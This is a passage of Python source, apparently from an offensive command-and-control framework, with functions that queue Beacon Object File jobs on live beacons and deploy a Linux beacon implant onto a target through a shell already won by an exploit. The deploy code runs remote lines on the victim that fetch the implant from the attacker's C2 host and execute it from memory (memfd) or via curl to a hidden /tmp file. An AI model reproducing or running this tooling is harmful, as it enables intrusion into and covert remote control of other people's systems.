    request = urllib.request.Request(url, headers={"Authorization": f"Basic {auth}"})
    try:
        with urllib.request.urlopen(request, timeout=cfg.request_timeout, context=context) as response:
            return response.status == 200
    except Exception as exc:
        log.debug("C2 reachability check failed at %s: %s", url, exc)
        return False


def run_bof(
    bof_name: str,
    client_id: str,
    args: list[str] | None = None,
    *,
    wait: float = 0.0,
    config: BofDeliveryConfig | None = None,
    payload: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Queue one BOF execution on a live beacon and optionally await output.

    Args:
        bof_name: Catalog BOF name.
        client_id: Target beacon client id.
        args: Argument list joined with commas for the BOF contract.
        wait: Seconds to wait for a result record (0 = fire and forget).
        config: Optional delivery configuration override.
        payload: Optional payload.json mapping override (tests).

    Returns:
        ``{delivered, client_id, command, result}``.
    """
    from core.config import load_payload

    cfg = config or BofDeliveryConfig()
    data = payload if payload is not None else load_payload()
    lhost = str(data.get("lhost", "127.0.0.1"))
    c2_port = str(data.get("c2_port", "4444"))
    c2_url = f"https://{lhost}:{c2_port}"
    stage_bof(bof_name, cfg)
    command = delivery_command(bof_name, c2_url, args=args)
    delivered = queue_to_beacon(client_id, command, cfg, data)
    result: dict[str, Any] | None = None
    since = time.time() if wait else None
    if delivered and wait:
        result = wait_for_beacon(client_id, since=since, timeout=wait, config=cfg, payload=data)
    return {"delivered": delivered, "client_id": client_id, "command": command, "result": result}


def run_bof_train(
    client_id: str,
    names: list[str],
    args: list[str] | None = None,
    *,
    wait: float = 20.0,
    config: BofDeliveryConfig | None = None,
) -> dict[str, Any]:
    """Run a sequence of BOFs over one beacon, waiting for each in turn.

    Args:
        client_id: Target beacon client id.
        names: Ordered BOF catalog names.
        args: Arguments passed to every BOF in the train.
        wait: Per-BOF wait limit for the result record.
        config: Optional delivery configuration override.

    Returns:
        ``{client_id, ran, delivered, results}`` where ``results`` keeps
        one entry per BOF name.
    """
    cfg = config or BofDeliveryConfig()
    clean = sanitize_client_id(client_id)
    results: list[dict[str, Any]] = []
    for name in names:
        entry = str(name or "").strip()
        if not entry:
            continue
        results.append(run_bof(entry, clean, args=args, wait=wait, config=cfg))
    return {
        "client_id": clean,
        "ran": [r["command"] for r in results],
        "delivered": all(r.get("delivered") for r in results) if results else True,
        "results": results,
    }


def _deploy_paths(addon: ClientAddon) -> dict[str, str]:
    """Return the remote artifacts and command template for one client.

    Args:
        addon: Resolved client addon.

    Returns:
        Mapping with ``target_path`` (binary) and ``config_path``
        (runtime config) on the target.
    """
    manifest = Path(ADDONS_DIR) / f"{addon.name}.yaml"
    binary_path = "/tmp/.svc"
    try:
        with open(manifest, "r", encoding="utf-8") as handle:
            data = yaml.safe_load(handle) or {}
    except Exception:
        data = {}
    tool = data.get("tool") or {}
    candidate = str(tool.get("download_file", "") or "").strip()
    if candidate and candidate.startswith("/") and ".." not in candidate.split("/"):
        binary_path = candidate
    config_name = _CLIENT_CONFIG_NAMES.get(addon.name)
    if config_name:
        config_path = os.path.join(os.path.dirname(binary_path), "config.json")
    else:
        config_path = ""
    return {"target_path": binary_path, "config_path": config_path, "config_name": config_name or ""}


def deploy_client(
    client: str,
    target: str,
    *,
    wait: float = DEPLOY_WAIT_DEFAULT_S,
    config: BofDeliveryConfig | None = None,
    payload: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Deliver a staged beacon client onto a target and await check-in.

    The target must already expose an exec-capable shell session from the
    atomic exploit bridge (see ``atomic_exploit run`` / ``atomic_shell``).
    Delivery walks a fallback chain and stops on the first check-in:

    1. Upstream diskless stager — token-gated ``/stage/`` endpoints, the
       beacon ELF + config are AES-CFB + HMAC protected under HKDF keys
       derived from the staging token and executed from an anonymous
       memfd (nothing touches the target disk).
    2. Raw ``/s/`` channel stager — same memfd execution without the
       token gate (works when the operator has not assigned one).
    3. Disk bootstrap — ``curl`` the ELF + config to ``/tmp`` and run
       detached (last resort, leaves files behind).

    Args:
        client: Lazyaddon client (``blacksandbeacon`` for Linux targets).
        target: Target IP the session already lives on.
        wait: Seconds to wait for the first beacon check-in.
        config: Optional delivery configuration override.
        payload: Optional payload.json mapping override (tests).

    Returns:
        ``{success, client_id, reason, deployed, attempts}`` where
        ``attempts`` keeps one entry per fallback that was tried.

    Raises:
        ValueError: Unsupported client or missing staged binary.
    """
    from core.config import load_payload

    cfg = config or BofDeliveryConfig()
    addon = load_client_addon(client, cfg)
    if addon.name != "blacksandbeacon":
        raise ValueError(
            f"deploy_client supports {sorted(_DEPLOY_COMMANDS)} (got {addon.name!r}); "
            "Windows beacon delivery runs through the lazyaddon prompt"
        )
    data = payload if payload is not None else load_payload()
    payload_lhost = str(data.get("lhost", "127.0.0.1"))
    c2_port = str(data.get("c2_port", "4444"))
    hmac_ok = not bool(data.get("c2_require_beacon_hmac", False))
    if not hmac_ok:
        return {
            "success": False,
            "deployed": False,
            "client_id": "",
            "reason": "payload c2_require_beacon_hmac is enabled but the packaged client sends no X-Signature",
        }
    since = time.time()
    staged = stage_client(addon.name, cfg, data)
    if not staged:
        raise ValueError(f"client binary staging failed for {addon.name!r}")
    client_id = str(data.get("beacon_client_id", "") or _DEFAULT_BEACON_CLIENT_ID).strip() or _DEFAULT_BEACON_CLIENT_ID
    paths = _deploy_paths(addon)
    stage_payload_b64 = _stage_payload_b64()
    session = _atomic_session(target)
    if session is None:
        return {
            "success": False,
            "reason": f"no exec session on {target}: open one with atomic_exploit run or atomic_shell",
            "client_id": "",
            "deployed": False,
        }
    attempts: list[dict[str, Any]] = []
    record: dict[str, Any] | None = None
    remaining = max(1.0, wait)
    for index, template in enumerate(_DEPLOY_COMMANDS[addon.name], start=1):
        if "stage_payload_b64" in template and not stage_payload_b64:
            attempts.append({"attempt": index, "style": "upstream-stage", "ran": False, "skipped": "no checkout"})
            continue
        probe = min(_DEPLOY_ATTEMPT_WAIT_S, remaining) if index < len(_DEPLOY_COMMANDS[addon.name]) else remaining
        remote_line = template.format(
            lhost=payload_lhost,
            c2_port=c2_port,
            target_path=paths["target_path"],
            config_path=paths["config_path"],
            binary_name=Path(addon.staged_binary).name,
            config_name=paths["config_name"],
            stager_b64=_FILELESS_STAGER_B64,
            stage_payload_b64=stage_payload_b64 or "",
            stage_token=str(data.get("stage_token", "") or ""),
        )
        session.run(remote_line, timeout=60)
        style = "disk" if "curl" in template else ("upstream-stage" if "stage_payload_b64" in template else "raw-s")
        attempts.append({"attempt": index, "style": style, "ran": True, "waited": probe})
        record = wait_for_beacon(client_id, since=since, timeout=probe, config=cfg, payload=data)
        if record:
            break
        remaining -= probe
        if remaining <= 0:
            break
    queue_to_beacon(client_id, "pwd", cfg, data)
    checked_id = str(record.get("client_id", "")) if record else ""
    style = attempts[-1]["style"] if attempts else "none"
    return {
        "success": bool(record),
        "client_id": checked_id,
        "deployed": True,
        "reason": (
            f"beacon {checked_id} checked in after {style} delivery"
            if record
            else f"all {len(attempts)} delivery fallbacks exhausted without check-in within {wait:.0f}s"
        ),
        "attempts": attempts,
        "record": record,
    }


class _DockerSession:
    """Minimal run() adapter over ``docker exec`` for lab-managed hosts.

    Methods mirror :class:`modules.atomic_exploit_bridge._ShellSession`
    (``alive()``/``run()``) so the delivery path treats a foothold shell
    and a lab-managed container identically.
    """

    def __init__(self, container: str) -> None:
        """Bind the adapter to one container name."""
        self._container = container

    def alive(self, timeout: int = 8) -> bool:
        """Return True while the container answers ``echo``.

        Args:
            timeout: Probe timeout seconds.

        Returns:
            True when the container is running.
        """
        from core.safe_exec import safe_run_argv

        try:
            result = safe_run_argv(
                ["docker", "exec", self._container, "echo", "ok"],
                timeout=timeout,
            )
        except (FileNotFoundError, Exception):
            return False
        return result.returncode == 0 and "ok" in (result.stdout or "")

    def run(self, command: str, timeout: int = 20) -> str:
        """Execute one shell line inside the container.

        Args:
            command: Shell command text.
            timeout: Wall-clock limit.

        Returns:
            Combined stdout/stderr (empty on failure).
        """
        from core.safe_exec import safe_run_argv

        try:
            result = safe_run_argv(
                ["docker", "exec", "-i", self._container, "sh", "-c", command],
                timeout=timeout,
            )
        except Exception:
            return ""
        return f"{result.stdout or ''}{result.stderr or ''}"


def _docker_session_for(target: str):
    """Find a running lab container whose IP matches a target.

    Args:
        target: IPv4 address reported by ``docker inspect``.

    Returns:
        A :class:`_DockerSession` when a live container owns the IP.

    Returns None otherwise.
    """
    from core.safe_exec import safe_run_argv

    try:
        ids = safe_run_argv(["docker", "ps", "-q"], timeout=30)
    except Exception:
        return None
    running = (ids.stdout or "").split()
    if not running:
        return None
    try:
        listing = safe_run_argv(
            [
                "docker",
                "inspect",
                "-f",
                "{{.Name}} {{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}",
                *running,
            ],
            timeout=30,
        )
    except Exception:
        return None
    wanted = str(target).strip()
    for line in (listing.stdout or "").splitlines():
        parts = line.strip().split()
        if not parts:
            continue
        name = parts[0].lstrip("/")
        if not name:
            continue
        for ip in parts[1:]:
            if ip == wanted:
                return _DockerSession(name)
    return None


def _atomic_session(target: str):
    """Return a live execution channel for a target, establishing one.

    Resolution order: the in-process atomic shell cache, the durable
    ``sessions/atomic_exploit_<target>_*.json`` sweep reports (which
    carry the shell-bearing exploit id across process boundaries),
    execution-capable specs in confidence order, and finally lab-managed
    docker containers whose IP matches the target (attacker-side beacon
    hosts spun up by the framework).

    Args:
        target: Target IP.

    Returns:
        An object with ``alive()``/``run()``, or None when none applies.
    """
    from modules import atomic_exploit_bridge as bridge

    for key, session in list(bridge._SESSIONS.items()):
        if key[0] == target and session.alive(timeout=8):
            return session
    try:
        from modules.atomic_exploit_bridge import ensure_session, load_all

        specs = load_all()
        for spec_id in _shell_bearing_specs(target):
            spec = specs.get(spec_id)
            if spec is None:
                continue
            try:
                session = ensure_session(spec, target)
            except RuntimeError:
                continue
            if session is not None and session.alive(timeout=8):
                return session
        for spec in sorted(
            (item for item in specs.values() if item.exec_trigger and item.exec_shell_port),
            key=lambda item: -item.confidence,
        ):
            try:
                session = ensure_session(spec, target)
            except RuntimeError:
                continue
            if session is not None and session.alive(timeout=8):
                return session
    except Exception as exc:
        log.debug("atomic session ensure failed: %s", exc)
    return _docker_session_for(target)


def _shell_bearing_specs(target: str) -> list[str]:
    """Return exploit ids that carried a shell in the newest sweep report.

    Args:
        target: Target address to look up.

    Returns:
        Ordered exploit identifiers (newest report first).
    """
    results: list[str] = []
    try:
        reports = sorted(
            Path(config_sessions_dir()).glob(f"atomic_exploit_{target}_*.json"),
            key=lambda path: path.stat().st_mtime,
        )
    except OSError:
        return results
    for path in reversed(reports):
        try:
            report = json.loads(path.read_text(encoding="utf-8", errors="replace"))
        except (OSError, ValueError):
            continue
        for row in report.get("attempts") or []:
            if row.get("shell") and row.get("id"):
                spec_id = str(row["id"])
                if spec_id not in results:
                    results.append(spec_id)
        if results:
            break
    return results


def config_sessions_dir() -> Path:
    """Return the sessions directory of the default delivery config."""
    return BofDeliveryConfig().sessions_dir


def _history_config(config: BofDeliveryConfig | None):
    """Build the beacon-history storage config for one delivery config.

    Args:
        config: Delivery configuration holding the sessions root.

    Returns:
        A :class:`modules.beacon_history.BeaconHistoryConfig` whose base
        directory points at the configured sessions parent.
    """
    from modules.beacon_history import BeaconHistoryConfig

    cfg = config or BofDeliveryConfig()
    return BeaconHistoryConfig(base_dir=Path(cfg.sessions_dir).parent)


def bof_results(
    client_id: str,
    limit: int = 20,
    config: BofDeliveryConfig | None = None,
) -> list[dict[str, Any]]:
    """Read the last beacon history records for one client.

    Args:
        client_id: Beacon client id (validated).
        limit: Maximum records.
        config: Optional delivery configuration override.

    Returns:
        Newest-first history records mentioning the ``bof:`` command.

    Raises:
        ValueError: Malformed client id.
    """
    from modules.beacon_history import read_records

    clean = sanitize_client_id(client_id)
    rows = read_records(clean, config=_history_config(config))
    bof_rows = [row for row in rows if str(row.get("command", "")).startswith("bof:")]
    return list(reversed(bof_rows))[: max(1, limit)]


__all__ = [
    "BofDeliveryConfig",
    "ClientAddon",
    "bof_results",
    "c2_reachable",
    "delivery_command",
    "deploy_client",
    "load_client_addon",
    "queue_to_beacon",
    "recent_beacons",
    "run_bof",
    "run_bof_train",
    "stage_bof",
    "stage_client",
    "staging_dir",
    "wait_for_beacon",
]
